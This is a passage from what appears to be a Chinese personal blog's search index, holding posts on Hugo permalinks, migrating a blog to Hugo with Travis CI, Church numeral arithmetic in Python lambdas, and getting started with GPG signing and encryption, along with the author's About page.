有一系列自建函数，实验过后可以生成类似于 hexo-abbrlink 效果的永久链接，就写了这篇文章记录。 ","date":"2018-12-30","objectID":"/post/9cc3283b/:0:0","tags":["博客记录","Hugo","permalink","永久链接"],"title":"Hugo 永久链接","uri":"/post/9cc3283b/"},{"categories":["博客记录"],"content":"1. 永久链接生成方案 永久链接的生成方案是比较简单的，直接对时间 + 文章名生成字符串做一下 md5 然后取任意 4-12 位即可。这样做的话 md5 冲撞概率极小，同时也没有那么大的运算负担。 而 Hugo 在永久链接中支持下面这个参数：slug。简单来说，我们可以针对每一篇文章指定一个 slug，然后在 config.toml 中配置 permalinks 包含 slug 参数，就可以生成唯一的永久链接。我们的目的就是对每篇文章自动生成一个 slug。 修改 archetypes/default.md 添加如下一行： --- #... slug: {{ substr (md5 (printf \"%s%s\" .Date (replace .TranslationBaseName \"-\" \" \" | title))) 4 8 }} #... --- 这样在每次使用 hugo new 的时候就会自动填写一个永久链接了。 之后修改 config.toml 添加如下行： [permalinks] post = \"/post/:slug\" 生成站点就可以了。 ","date":"2018-12-30","objectID":"/post/9cc3283b/:1:0","tags":["博客记录","Hugo","permalink","永久链接"],"title":"Hugo 永久链接","uri":"/post/9cc3283b/"},{"categories":["博客记录"],"content":"2. 页末显示本文永久链接 既然有了永久链接，那么在版权页做一个分享也是很简单的了。 我已经修改好了一个主题，可以直接 clone 这个新主题代替原版：http://github.com/lxdlam/hugo-theme-even 然后前往 config.toml，添加如下项： enablePermalinks = true 重新生成页面就可以了。 ","date":"2018-12-30","objectID":"/post/9cc3283b/:2:0","tags":["博客记录","Hugo","permalink","永久链接"],"title":"Hugo 永久链接","uri":"/post/9cc3283b/"},{"categories":null,"content":"Who am I Ramen or lxdlam. Contact me: Email: lxdlam \u003cat\u003e gmail.com Github: https://github.com/lxdlam Steam: https://steamcommunity.com/id/lxdlam/ Exophase: https://www.exophase.com/user/lxdlam/ Keybase.io: https://keybase.io/lxdlam 网易云音乐: https://music.163.com/#/user/home?id=50007598 GPG 公钥指纹: 343A1DD157A29AC367355C31707B412B872E02BE Nintendo Switch FC: 因为某些原因撤下，欢迎通过邮箱等方式联系我~ ","date":"2018-12-29","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Coding ","date":"2018-12-29","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"算法竞赛 兴趣使然的前算法竞赛选手。 xCPC 成绩： 2018 ICPC 北京区域赛 银牌 Rank 14 2018 CCPC 秦皇岛站 铜牌 2019 ICPC 山东省省赛 金牌 Rank 18 2018 ICPC 山东省省赛 银牌 我的算法竞赛代码仓库地址为：https://github.com/lxdlam/CP-Answers，已经很久没有打比赛/做题了，正在找时间重启。如有问题欢迎和我讨论。 ","date":"2018-12-29","objectID":"/about/:2:1","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"工作/实习经历 目前并不找工作。 北京字节跳动科技有限公司 Data-商业化技术-中国区商业化-智能优化（2019.7-2021.08） Data-商业化技术-中国区商业化-直播变现与千川（2021.08-至今） C++、Go 工程师，也写 Python 和 Java（偶尔）。 参与过核心投放链路的工程开发与维护，曾作为核心组件的工程开发主力之一。 参与模型特征工程相关工作，包括数据流、特征处理以及线上 Serving 等工作。 ","date":"2018-12-29","objectID":"/about/:2:2","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"环境与技术栈 开发设备与环境 MacBook Pro 16-inch 2019。 VSCode 为主力编辑器，JetBrains IDE 作为主力工具。 语言和技术栈 C++(17 and later) \u003e Go = Python \u003e Rust； 熟练掌握 Unix 下的相关操作，命令行就是我的第二战场； 了解一些语言，正在学习一些语言，同时有兴趣学习其他语言； 服务器编程 \u003e Web 全栈开发 \u003e 系统编程； 不断地学习和补充自己的短板，学习新的领域知识，不止计算机相关。 ","date":"2018-12-29","objectID":"/about/:2:3","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Wakatime 下班比较晚，回家之后就很少写代码了，下面只统计了在私人电脑的时间。 ","date":"2018-12-29","objectID":"/about/:2:4","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Music 如果你想听我喜欢的音乐，可以试试下面的Ramen 精选集。 Ramen 精选集的更新正在路上。 电子音乐制作新人，正在学习基本原理和 Logic Pro X。 ","date":"2018-12-29","objectID":"/about/:3:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Games 音游玩家/任天堂玩家，次时代主机集齐。 Gamecard： 主要玩的游戏和水平为： 主机和 PC Splatoon 2: A+/A/A-/A+ Splatoon 3: 第一赛季 S+0 街机音游 Jubeat festo: jubility 6530 Reflec Beat: Fly to next world 99.6% SDVX 5: 刚力罗，VF 15.25 Chunithm NEW!!: IV 段徽章，Rating 16.46 Nostalgia Op.3: 五级，Grade 5055 maimai DX: Rating 7500 移动端 Phigors: RKs 14.26 Arcaea: ptt 12.12 Cytus I: Codename: Zero TP 99.68%, Sweetness Overload!!! 99.34% Cytus II: 3.6.5 版本 CHAOS MM 345/371，REmorse TP 100%, FUJIN Rumble TP 99.90% 还玩一些其他游戏，但是水平比较一般。 希望你度过美好的一天。 ","date":"2018-12-29","objectID":"/about/:4:0","tags":null,"title":"About","uri":"/about/"},{"categories":["博客记录"],"content":"我又换博客了。 从 5 月开始到现在一直在不断的刷题忙比赛的事，一直没来得及继续写博客，算算有八个月了，大半年过去了。 最近打算集中火力写一系列文章，所以准备重新把博客弄起来。 然而，我回到 Hexo 重新 rebuild 了一下站点，60s 的生成速度实在是令人难以恭维。正巧在上个月，我听说了 Hugo 这个神器，就准备试用一下。结果这一试用，我就回不来了。花了一整天时间把博客迁移到了 Hugo，这篇文章就记录一下迁移的过程。 ","date":"2018-12-29","objectID":"/post/e08d2378/:0:0","tags":["Hugo","even","博客记录"],"title":"World rebuild","uri":"/post/e08d2378/"},{"categories":["博客记录"],"content":"1. 安装 Hugo 与建站 这一步没什么难度，由于我用的是 Manjaro，直接： sudo pacman -S hugo 然后就装完了。 站点的生成更简单，直接： hugo new site Blog 就没了。这几步跟着官方做还是挺简单的。 ","date":"2018-12-29","objectID":"/post/e08d2378/:1:0","tags":["Hugo","even","博客记录"],"title":"World rebuild","uri":"/post/e08d2378/"},{"categories":["博客记录"],"content":"2. 修改与配置主题 主题我用的是 Even，直接把它下载到 themes/even 文件夹即可： git clone https://github.com/olOwOlo/hugo-theme-even themes/even 然后把 themes/even/exampleSite 下面的 config.toml 复制到站点根目录并且修改配置。 下面是我用到的配置项： defaultContentLanguage = \"zh-cn\" # 默认中文 archivePaginate = 20 # 归档页显示的文章条数 mathjaxEnableSingleDollar = true # 允许使用一个 $ 符号声明行内公式 [permalinks] post = \"/:year/:month/:day/:filename\" # 永久链接格式 其他配置项大家按需求配置。 ","date":"2018-12-29","objectID":"/post/e08d2378/:2:0","tags":["Hugo","even","博客记录"],"title":"World rebuild","uri":"/post/e08d2378/"},{"categories":["博客记录"],"content":"3. 迁移 迁移的过程是比较痛苦的。不过这个痛苦和 Hugo 以及 Hexo 都没什么关系，是 Typora 的锅。 简单来说，Hugo 和 Hexo 支持的 Markdown 是差不多的，都是在开头使用 Toml/YAML 写 Metadata，下面用 Markdown 写正文。而我因为 Typora 的锅，又全文重新修了所有 .md 排版，还好文章不是很多。 文章的组织结构需要谈一下。Hugo 的文章都组织在 content 下面。 对于 index.md 文件，Hugo 的匹配路由是当前文件夹名称。比如 post/index.md，路由就是 /post/。 对于命名文件，Hugo 的匹配路由是当前文件夹的二级目录。比如 post/hello.md， 路由就是 /post/hello。 如果配置了永久链接 (Permalink)，那么 Hugo 直接按照永久链接生成路径。 比如，下面的文件夹结构： . ├── about │ └── index.md └── post ├── hello │ └── index.md └── world.md 生成了下面三个路由： /about/ /post/hello /post/world 更多的参考官方文档：https://gohugo.io/content-management/organization/。 迁移到 Hugo 之后有两个地方还是需要注意的： 永久链接没有插件支持了，还是回到了原来的配置方案。 MathJax 在 Markdown 之后处理 _ 的问题回来了，在数学公式中使用 \\_ 代替 _。 ","date":"2018-12-29","objectID":"/post/e08d2378/:3:0","tags":["Hugo","even","博客记录"],"title":"World rebuild","uri":"/post/e08d2378/"},{"categories":["博客记录"],"content":"4. 自动构建的配置 由于 Hugo 是二进制发行，不像 Hexo 一样带着诸多依赖，使用 CI/CD 服务来自动构建博客就变得容易多了。我使用的是 Travis CI。 首先是用 git 把博客管理起来。 git init 然后是刚才的主题，使用 git submodule 来控制： rm -rf themes/even git submodule add https://github.com/olOwOlo/hugo-theme-even themes/even 然后是生成一个 .gitignore 文件，我是用的是 http://gitignore.io 提供的 Hugo 模板： ## Created by https://www.gitignore.io/api/hugo ## Edit at https://www.gitignore.io/?templates=hugo ### Hugo ### ### Hugo ### ## gitginore template for Hugo projects ## website: https://gohugo.io ## generated files by hugo /public/ /resources/_gen/ ## executable may be added to repository hugo.exe hugo.darwin hugo.linux ## End of https://www.gitignore.io/api/hugo 然后是添加 Travis CI 的配置文件。这个是我的 .travis.yml： ## .travis.yml language: go git: depth: 1 install: go get -v github.com/gohugoio/hugo script: - hugo ## push to page service after_script: - cd ./public - git init - git config user.name \"{name}\" - git config user.email \"{email}\" - git add . - git commit -m \"Blog builds $TRAVIS_BUILD_NUMBER using Travis CI\" - git push --quiet --force \"https://${GITHUB_ACCESS_TOKEN}@${GITHUB_REPO_URL}\" master:master - git push --quiet --force \"https://{username}:${CODING_ACCESS_TOKEN}@${CODING_REPO_URL}\" master:master env: global: - GITHUB_REPO_URL: {Your github repo url} - CODING_REPO_URL: {Your coding repo url} 把你的信息填上去，保存到根目录。 然后就一股脑的交给 git： git add * git add .* git commit -S -m \"Initialize blog using hugo\" git remote add \u003cYour Repo URL\u003e origin git push -u origin master 之后我们来到 Travis CI。使用 Github 授权登录之后应该能在 Dashboard 直接看到我们的项目已经 Trigger 了一个 Build。 这个 Build 自然是 Failed，因为两边的 Access Token 都还没有。 生成 Access Token 很简单： Github：右上角头像 -\u003e Settings -\u003e Developer Settings -\u003e Personal access tokens -\u003e Generate new token，记得要给到 public_repo 这个权限。 Coding：右上角头像 -\u003e 个人设置 -\u003e 访问令牌 -\u003e 新建令牌，记得要给到 project:depot 权限。 然后回到 Travis CI，点击我们的仓库，找到主面板右上角的 More options -\u003e Settings，在 Enviroment Variables 里面填上这两个 Token。然后 回到 Current 选项卡，点击 Restart Build，稍等一会儿，是不是就成功了？ 以后就直接本地写文章，然后推送到远端仓库，博客就会自动构建了。 当然，Travis CI 免费版只支持开源仓库，你也可以使用 Circleci、Jekins 或者 Netlify 等服务，无非就是下载 Hugo -\u003e 生成站点 -\u003e 推送到仓库三步而已。 博客迁移到这里就结束了。说实话，迁移只花了一天我是没想到的，我原以为可能还需要一两天。Hugo 的生成速度也极快，不到 1s 的时间消耗真的让人心情愉悦。 手上又挖了几个坑，2019 年集中填一波。下篇文章见！ ","date":"2018-12-29","objectID":"/post/e08d2378/:4:0","tags":["Hugo","even","博客记录"],"title":"World rebuild","uri":"/post/e08d2378/"},{"categories":["技术笔记"],"content":"忙过了这一茬，趁着下一茬还没来，我先填填坑～ 在上一篇文章里面，我们谈到了如何去表达一个自然数系统：0以及后继，然后写出了邱奇计数法中的0和后继表达方式。作为一种验证和转化手段，我们也描述了邱奇化和去邱奇化的有关内容，更好的去验证我们的结果。 然而，一个代数系统，光有数可远远不够，我们还需要有各种运算。 今天，让我们来谈谈运算的内容，除了加法、乘法、乘方以外，我还将给你展示使用代换模型来展开函数，从而去更好的理解整个运算过程。 准备好了吗？让我们开始吧！ ","date":"2018-05-21","objectID":"/post/0a75011e/:0:0","tags":["Church Numeral","Church Encoding","邱奇计数","Python","函数式编程"],"title":"邱奇计数 (2)","uri":"/post/0a75011e/"},{"categories":["技术笔记"],"content":"0x03. 从后继谈起 我们在上一篇文章已经提到了后继，所谓的后继，就是一个数的后一个数，比如$2$的后继是$3$。从这里其实很容易得到一个想法，我们假如要在$m$上加上$n$，我们只需要在$n$上应用$m$次后继即可呀。而我们考虑$m$的意义：应用$m$次$f$函数……对！我们把这个$f$换成$\\text{succ}$不就可以了！ 所以，我们这里很容易推到得出这个式子：$n+m=m\\ \\text{succ}\\ n$。 那我们就可以写出这样的函数： add = lambda n, lambda m: m(succ)(n) 你可以看到，我们的模型很巧妙，我们对$m$应用$\\text{succ}$和$n$，那么$n$上原来有$n$次$\\text{succ}$，现在再应用了$m$次$\\text{succ}$，正好就是$m+n$次！ 这是加法最简单，最容易理解的实现。然而，这个实现不容易帮我们理解，到底内部做了什么，而当我们知道了准确的应用过程，我们才能更好的推断乘法和乘方。 Quiz 1 解释使用 add(zero, zero) 时会发生什么，为什么会得到$0$？ ","date":"2018-05-21","objectID":"/post/0a75011e/:1:0","tags":["Church Numeral","Church Encoding","邱奇计数","Python","函数式编程"],"title":"邱奇计数 (2)","uri":"/post/0a75011e/"},{"categories":["技术笔记"],"content":"0x04. 加法 那现在让我们抛弃$\\text{succ}$，我们直接从$m$和$n$推导加法。说的很壮观，其实也不难：我们只需要知道加法到底做了什么即可。 首先我们考虑$n$的含义。假设现在我有一个$f$和$x$，然后应用得到$n\\ f\\ x$，那么实际上我得到了一个数。那么我们就考虑，所谓的邱奇计数，是在$x$上应用多次$f$，那么现在假如我想对这个新的数再应用多次怎么办？我们会产生如下调用：$m\\ f\\ (n\\ f\\ x)$。这样下来，我们就对这个数又应用了$m$次$f$，实际上$f$应用了几次？$n+m$！ 对，加法模型的推导就是如此的直观，我们首先把$n$应用到最终结果得到$n$这个数，然后再在$n$这个数上应用多次$m$，我们就得到了$n+m$。 从这个角度，我们可以得到如下这个式子：$n+m=\\lambda f.\\lambda x.m\\ f\\ (n\\ f\\ x)$。一切都是那么的直观。 那么我们也就很容易写出这样的函数了： add = lambda n, m: lambda f: lambda x: m(f)(n(f)(x)) 让我们掉过头来，再从$\\text{succ}$的角度看我们新推导的这个式子： 首先我们有$n+m=m\\ \\text{succ}\\ n$，展开得到：$n+m=\\underbrace{\\text{succ}(\\cdots(\\text{succ}\\ n)\\cdots)}_{\\text{m times}}$。而我们又知道$\\text{succ}\\ n=\\lambda f.\\lambda x. f\\ n$，我们代换到前一个式子，我们可以得到$n+m=\\underbrace{\\lambda f.\\lambda x. f(\\cdots(\\lambda f.\\lambda x. f\\ n)\\cdots)}_{\\text{m times}}$，我们把外侧的$m$个$\\lambda f.\\lambda x.f$合并，就得到了$n+m=\\lambda f.\\lambda x.m\\ f\\ (n\\ f\\ x)$。 你看，我们使用代换模型展开使用后继的加法后，实际上得到的是与我们推导的不使用后继的加法等价的。 让我们试试使用Python代码展开$1+2$。 我们很容易得到$1$和$2$： one = lambda f: lambda x: f(x) two = lambda f: lambda x: f(f(x)) 接下来，我们调用add(one, two)。首先，我们把二者带入进去，得到： lambda f: lambda x: two(f)(one(f)(x)) 然后我们先展开two（直接在对应位置上用展开式替换two即可）： lambda f: lambda x: (lambda x: f(f(x)))(one(f)(x)) 现在展开one就简单许多： lambda f: lambda x: (lambda x: f(f(x)))((lambda x: f(x))(x)) 仔细数一数，刚好是三层调用 :)。 Quiz 2 写出 add(two, three) 的Python代码展开，其中 two = succ(succ(zero))，three = succ(two)。 ","date":"2018-05-21","objectID":"/post/0a75011e/:2:0","tags":["Church Numeral","Church Encoding","邱奇计数","Python","函数式编程"],"title":"邱奇计数 (2)","uri":"/post/0a75011e/"},{"categories":["技术笔记"],"content":"0x05. 乘法 加法之后，让我们来看看乘法。 所谓的乘法其实很简单，我们多次应用加法即可。但是这里存在一个问题，我们怎么确定加法的界限？我们的$n$，$m$是邱奇数，我们并没有很好的直接比较的方法，不管怎么写都不好写。 让我们来看看邱奇数本身。首先，讨论一个一般的邱奇数$n$，展开它，$n=\\lambda f.\\lambda x.f\\ x$（我们就先假设$n=1$吧。）在这里面，$f$是一个函数，$x$是一个数，它的意义是我们把$f$应用一次在$x$上。在上面的加法中，我们把$x$换成了我们换成了其中的一个数，完成一步代换。 我们重点思考这么一个描述：把$f$应用一次在$x$上。对于更一般的邱奇数$n$，我们邱奇数的表达方法实际上是应用了$n$次$f$。我们现在掉头回来考虑乘法：我们的乘法是怎么回事呢？考虑$n\\times m$，我们实际上是应用$m$次原数加上$n$…… 这两个描述是一致的！也就是说，我们所谓的乘法，就是在原数的外侧套上多次$f$的过程。我们现在可以看到，所谓的$m\\ f\\ x$是把$f$应用$m$次到$x$上，那如果我们要$n\\times m$呢，我们只需要在$x$上应用$m$次$n$即可！ 经过这一番推导，我们可以得到这样的展开式：$n\\times m =\\lambda f.\\lambda x. m\\ (n \\ f)\\ x$。 这个式子是很好理解的：我们首先应用$n$次$f$，把这个看成一组，再应用$m$组，就是$n\\times m$。 那这样，我们的mult函数也就十分容易了： mult = lambda n, m: lambda f: lambda x: m(n(f))(x) 这里面我们稍微讨论一下每一个的类型：我们的n接受两个参数，目前我们只应用了一个，所以n(f)是一个签名类似于这样的函数：lambda x:……，这个函数的签名完全适合m的需要（复习：f是一个只接受单参数的函数），然后代换下来，每一个的函数签名都需要x，可以正确的应用下去。下面的展开也将展示这一点。 接下来让我们展开$1\\times2$的Python代码。 我们直接调用mult(one, two)吧： lambda f: lambda x: two(one(f))(x) 接下来，我们先展开one： lambda f: lambda x: two((lambda x: f(x))(x) 然后展开two： lambda f: lambda x: (lambda f: lambda x: f(f(x)))(lambda x: f(x))(x) 这个式子可能比较难理解，因为我把f应用到了one上但是没有把展开后的one应用到two上，其实这个式子本身表达的还是$m\\ f\\ x$。乘法的式子我们再做深入展开就会显得很复杂，而且冗余部分太多，所以我展开到这里就结束了。 Quiz 3 写出 mult(two, three) 的Python代码展开，其中 two = succ(succ(zero))，three = succ(two)。 ","date":"2018-05-21","objectID":"/post/0a75011e/:3:0","tags":["Church Numeral","Church Encoding","邱奇计数","Python","函数式编程"],"title":"邱奇计数 (2)","uri":"/post/0a75011e/"},{"categories":["技术笔记"],"content":"0x06. 乘方 我们先回味一下上面两个运算：加法，我们把数应用到了$x$上，乘法，我们把函数应用到了$f$上。我们还能应用什么？ 让我们再突破一次极限吧。 首先考虑乘方运算本身：$n^m$，我们是把乘以$n$应用$m$次。计数吗？我们上一节讨论过，并不是很可行。 我们现在再度考察我们的乘法：$n\\times m=\\lambda f.\\lambda x. m\\ (n \\ f)\\ x$。我们这里是应用了$m$次$n$，实际上是应用了$m$次$n\\ f$。那么，假如说，我们单独应用$m$次$n$呢？不行，不行。为什么？$n$是一个接受两个参数的函数，$m$的$f$参数是接受一个参数的函数，这连类型都不符合怎么可能能应用呢？ 现在清空一下你的大脑，我们重新讨论$f$和$x$。 在这之前我说过，$f$是一个接受单参数的函数，$x$呢是一个数，我们的邱奇计数表达的是$x$嵌套应用到$f$上的过程。这句话隐含的内容是，$f$有一个参数位，$x$没有参数位。但是我们考虑其中的这一个情况，假如说$f$有两个参数位，$x$有一个参数位呢？$x$会被应用到$f$的第一个参数位上，然后返回一个什么？返回一个新的函数！这是一个接受一个参数的函数。这个参数应用到哪儿了？$f$的第二个参数位上！ 这就是函数作为一级对象的另一个抽象武器：函数作为返回值。之前我们讨论的函数作为参数我们用了许多：邱奇数本身就是个函数。然而，在之前的运算中，我都或多或少的略过了函数作为返回值的内容，因为运算返回邱奇数都是返回了一个函数。为什么这里要提？因为这一条将作为我们最强大的武器去解决乘方运算。 乘方运算难度并不高，我们的关键是在要了解清楚整个流程。根据上面的讨论，我们的$f$、$x$都可以是函数，那么我们考虑这么一个应用：我们首先单独把$n$应用到$m$的$f$上，这里得到了应用$m$次$n$，也就是$m\\ n$，这里我们就会对之后的内容应用$m$次$n$。接下来我们考虑，我们对$f$应用一次$n$，得到的是$n\\ f$，那就是$n$，应用两次呢？$n\\ (n\\ f)$，这个模型应该是很眼熟了（如果我们把$x$应用上去就是$n\\ (n\\ f)\\ x$），是我们的乘法模型，得到的是$n\\times n=n^2$。那也就是说，我们对$f$应用了多少次$n$，就是$n$的多少次方，那么，应用$m$次就是……$n^m$！我们再看上面那个式子，可以看到，我们的应用对象是$f$，也就是说，这里我们的$f’=n,x’=f$。所以说，我们有了内部的应用：$m\\ n\\ f$，它的含义就是我们对$f$应用$m$次$n$。还没有结束，$n$是一个双参数函数，$f$是一个单参数函数，应用结束后返回了一个需要一个参数的函数，所以我们需要再应用一个数上去，我们上面什么没用？$x$！我们把$x$应用进去即可：$(m\\ n\\ f)\\ x$。 所以，我们的乘方就是这么一个式子：$n^m=\\lambda f.\\lambda x.(m\\ n\\ f)\\ x$。 写成Python的函数就是这样了： cpow = lambda n, m: lambda f: lambda x: (m(n)(f))(x) # pow是一个内置函数，避免重名 # 我们也可以这么写, 去掉那个多余的括号 # cpow = lambda n, m: lambda f: lambda x: m(n)(f)(x) 来，惯例让我们展开$1^2$。 我们也是直接调用cpow(one, two)： lambda f: lambda x: (two(one)(f))(x) 依据国际惯例，我们还是先展开one： lambda f: lambda x: (two(lambda f: lambda x: f(x))(f))(x) 最后展开two： lambda f: lambda x: (lambda f: lambda x: f(f(x)))(lambda f: lambda x: f(x))(f)(x) 结束了。这个展开式的签名和我们期待的一样：当我们逐步应用进去后，前面刚好缺一个参数x，然后我们紧接着就有一步应用，完成了整个乘方过程。 Quiz 4 写出 cpow(two, three) 的Python代码展开，其中 two = succ(succ(zero))，three = succ(two)。 我们这一次的内容就到这里。 相信你再一次被邱奇计数所震撼：我们从最简单的后继开始，展开得到加法，然后不断推进运算中$n$所在的位置，从在$n$外侧套上$m$次$f$调用，到$m$次调用$n\\ f$，再到$m$调用$n$，一步步把答案往更高层次推进。 在这个推进过程中，我们一次次突破了我们心目中的抽象极限：先是使用一个并不存在的数（应用时还没有被求值）去替换了$m$的$x$调用，然后使用邱奇数这个函数本身去替换了$m$的$f$调用，到最后，我们甚至部分应用了$m$，仅仅使用没有调用$f$的$n$去替代$f_m$。这一个个过程，依赖于函数作为一级对象。邱奇数是逻辑意义上的数，程序意义上的函数，我们把邱奇数（函数）作为一级对象，获得的是远比基础数据类型作为一级对象更加强大的抽象能力。 本节你看到了lambda表示法和函数作为一级对象带来的强大抽象能力。事实上，这二者的结合远比你想象中的更强大，这一部分稍后有机会我们再讨论。 在本节，我还对每个运算使用代换模型进行展开，这是一个洞悉函数内部运算过程和机理的很有力的手段，在算法分析过程中也十分重要。每一块的习题都要求你使用代换模型展开我们的式子，不知道你是否对这个工具稍稍熟悉了？ 下一篇文章，也就是这系列短文的终结，让我们回归lambda表示法的本源，数学，从数学推导和函数应用来探讨前驱与减法。如果有机会，我们还可以展望一下Scott Encoding以及邱奇计数的本质。 之后再见了！ 本节Quiz的答案如下： 答案 解释使用add(zero, zero)时会发生什么，为什么会得到$0$？ 这一条的解释十分简单，我们调用这条以后会得到的是如下形式：zero(succ)(zero)，你可以发现，由于在zero中，f并没有任何作用，所以后面的zero根本就没有调用上succ，然后我们再调用zero，那自然而然就是$0$了。 写出add(two, three)的Python代码展开，其中two = succ(succ(zero))，three = succ(two)。 lambda f: lambda x: ((lambda x: f(f(x)))((lambda x: f(f(f(x))))(x))) 写出mult(two, three)的Python代码展开，其中two = succ(succ(zero))，three = succ(two)。 lambda f: lambda x: (lambda f: lambda x: f(f(x)))(lambda x: f(f(f(x))))(x) 写出cpow(two, three)的Python代码展开，其中two = succ(succ(zero))，three = succ(two)。 lambda f: lambda x: ((lambda f: lambda x: f(f(f(x))))(lambda f: lambda x: f(f(x))))(f)(x) 本节的所有代码如下（包含上节）： zero = lambda f: lambda x: x one = lambda f: lambda x: f(x) succ = lambda n: lambda f: lambda x: f(n(f)(x)) unChurch = lambda n: n(lambda x: x + 1)(0) tcHelper = lambda n, m: m if n == 0 else tcHelper(n - 1, succ(m)) toChurch = lambda n: tcHelper(n, zero) # add(two, three) # using succ: add = lambda n, m: m(succ)(n) add = lambda n, m: lambda f: lambda x: m(f)(n(f)(x)) mult = lambda n, m: lambda f: lambda x: m(n(f))(x) cpow = lambda n, m: lambda f: lambda x: (m(n)(f))(x) def main(): \"\"\" Test wrapper. The test of Church numeral. 1. zero and succ \u003e\u003e\u003e unChurch(zero) 0 \u003e\u003e\u003e unChurch(succ(succ(zero))) 2 2. unChurch and toChurch \u003e\u003e\u003e unChurch(toChurch(0)) 0 \u003e\u003e\u003e unChurch(toChurch(198)) 198 3. add \u003e\u003e\u003e unChurch(add(zero, zero)) == 0 + 0 True \u003e\u003e\u003e unChurch(add(toChurch(195),toChurch(267))) == 195 + 267 True 4. mult \u003e\u003e\u003e unChurch(mult(zero, zero)) == 0 * 0 True \u003e\u003e\u003e unChurch(mult(toChurch(195), toChurch(233))) == 195","date":"2018-05-21","objectID":"/post/0a75011e/:4:0","tags":["Church Numeral","Church Encoding","邱奇计数","Python","函数式编程"],"title":"邱奇计数 (2)","uri":"/post/0a75011e/"},{"categories":["个人记录"],"content":"隐私问题一直闹得沸沸扬扬，今天刚好在Github提交的时候想起来GPG公钥这个东西，所以就搞了半个小时，做了自己的首个GPG Key然后做了一些绑定。 你可以在左边那一栏看到我的keybase.io，如果只是想体验体验的话，在这里可以找到我的公钥，然后使用我的公钥加密你的信息，然后在下面留言给我😄 ","date":"2018-04-30","objectID":"/post/df74bcdd/:0:0","tags":["PGP","GPG","公钥","隐私"],"title":"开始使用GPG","uri":"/post/df74bcdd/"},{"categories":["个人记录"],"content":"0x00. GPG与用途 要了解什么是GPG，就要先了解PGP。 1991年，程序员Phil Zimmermann为了避开政府监视，开发了加密软件PGP。这个软件非常好用，迅速流传开来，成了许多程序员的必备工具。但是，它是商业软件，不能自由使用。所以，自由软件基金会决定，开发一个PGP的替代品，取名为GnuPG。这就是GPG的由来。 GPG有许多用途，本文主要介绍文件加密。至于邮件的加密，不同的邮件客户端有不同的设置，请参考Ubuntu网站的介绍。 上面这段来自阮一峰的博客。 那GPG目前主要用途就是信息加密和签名，加密就是对一段信息使用公钥加密之后再发送给收信人，然后再用私钥解密即可；签名是对当前文件的信息进行计算得到一个.gpg文件，任何使用这个文件的人可以使用你的公钥来验证这个文件是不是经过你签名的文件，保证真实性（不会是其他人的修改版）。目前主要应用于加密沟通如邮件加密、信息加密和文件签名，如对程序进行签名发布等。 至于原理上的RSA算法，大家可以自行探索。 ","date":"2018-04-30","objectID":"/post/df74bcdd/:1:0","tags":["PGP","GPG","公钥","隐私"],"title":"开始使用GPG","uri":"/post/df74bcdd/"},{"categories":["个人记录"],"content":"0x01. 生成一对密钥 注意，以下操作都是Linux下进行，Windows下你可以尝试Bash on Windows。 首先检查你有没有gpg： gpg --version 如果没有版本信息就直接安装，所有版本库都会带的。 安装结束之后，开始生成我们的密钥对。 你可以使用： gpg --gen-key 也可以使用： gpg --full-generate-key 上一个默认生成一个2年有效期，使用RSA2048算法加密的密钥，如果你想调整这个（比如创建一个终身使用的）就选择第二个。 创建过程十分简单，输入你的姓名邮箱，给私钥设置一个保护密码就结束了。 如果你使用第二个的话，只需要跟着提示选择加密算法和过期时间即可，十分简单。 目前的生成流程都会生成一个撤销证书，用于公钥服务器来撤销你的公钥使用，如果你不放心可以自己生成一个： gpg --gen-revoke 注意：如果你的私钥遗失了，没有任何办法来恢复你加密过的所有信息！而如果你的私钥泄露了，你所有加密的信息全部泄露！所以请妥善保管你的私钥！ 结束以后你需要发布你的公钥来让别人验证时和加密时使用。 你可以选择直接把公钥文件发布出去： gpg --list-keys #查看所有密钥，记录下密钥ID gpg -a -o \u003ctarget_path\u003e --export \u003cpublickey_ID\u003e #target是导出路径，publickey_ID是上一部你记录的公钥ID 这样在发布的时候把这个文件打包发布或者挂在你网站的某些地方即可。 当然，每次都这么搞很麻烦，我们可以把它发布到一个公钥服务器上。世界上有很多这样的服务器，当你上传到一个服务器之后，经过公钥交换机制，所有公钥服务器都会有你的公钥。 gpg --keyserver pgp.mit.edu --send-keys \u003ckeyID\u003e 等执行结束就可以了～到时候你就可以在发布的时候指定你的密钥ID的后面几位，别人通过这个可以在任意公钥服务器上下载到你的公钥。 当然，由于这些服务器是公开的，任何人都可以以你的名义上传公钥，所以一般公布公钥的ID是最好的（这其实就是你公钥的哈希值）。 ","date":"2018-04-30","objectID":"/post/df74bcdd/:2:0","tags":["PGP","GPG","公钥","隐私"],"title":"开始使用GPG","uri":"/post/df74bcdd/"},{"categories":["个人记录"],"content":"0x02. 签名与加密 ","date":"2018-04-30","objectID":"/post/df74bcdd/:3:0","tags":["PGP","GPG","公钥","隐私"],"title":"开始使用GPG","uri":"/post/df74bcdd/"},{"categories":["个人记录"],"content":"0. 公钥添加 上文提到了上传你自己的公钥，这里顺带一提下载的问题。 导入公钥文件： gpg --import \u003cpublickey\u003e 从服务器下载公钥： gpg --keyserver pgp.mit.edu --recv-keys \u003ckeyID\u003e 很简单对吧～ ","date":"2018-04-30","objectID":"/post/df74bcdd/:3:1","tags":["PGP","GPG","公钥","隐私"],"title":"开始使用GPG","uri":"/post/df74bcdd/"},{"categories":["个人记录"],"content":"1. 签名 签名的过程很简单，使用 gpg --sign \u003cfilepath\u003e #filepath是文件名 即可，之后会在相同路径出现一个名为\u003cfilepath\u003e.gpg的二进制签名文件。 如果你想要ASCII输出： gpg --cleansign \u003cfilepath\u003e 这样会出现一个名为\u003cfilepath\u003e.asc的签名文件，可以用cat \u003cfilepath\u003e.asc来看看里面有什么。 如果你想要发布一个程序，建议使用分离签名： gpg --detach-sign \u003cfilepath\u003e 这样的签名文件是\u003cfilepath\u003e.sig。当你要发布这个文件的时候，需要发布源文件和这个独立的分离签名。 ","date":"2018-04-30","objectID":"/post/df74bcdd/:3:2","tags":["PGP","GPG","公钥","隐私"],"title":"开始使用GPG","uri":"/post/df74bcdd/"},{"categories":["个人记录"],"content":"2. 验证签名 你可以直接使用： gpg --verify \u003csignature_path\u003e 来验证一个签名。如果是分离签名，则使用如下的方式： gpg --verify \u003csignature_path\u003e 